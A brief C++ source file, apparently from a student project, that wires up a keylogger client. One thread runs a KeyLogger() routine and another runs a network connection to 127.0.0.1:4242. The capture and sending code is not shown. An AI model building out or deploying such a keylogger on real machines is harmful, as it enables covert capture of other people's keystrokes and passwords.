//
// Created by Nagamo_s on 03/10/2017.
//

#include "Core.hpp"

Core::Core()
{
	Tools &tools = Tools::Instance();
    local = new Local();
    network = new Network(io_service,"127.0.0.1", "4242");
}

Core::~Core()
{
    delete local;
}

void net(Core *core)
{
    core->io_service.run();
}
void loc(Core *core)
{
    core->local->KeyLogger();
}

void Core::client()
{

	std::thread second(loc, this);
	std::thread first(net, this);
	second.join();
	first.join();
}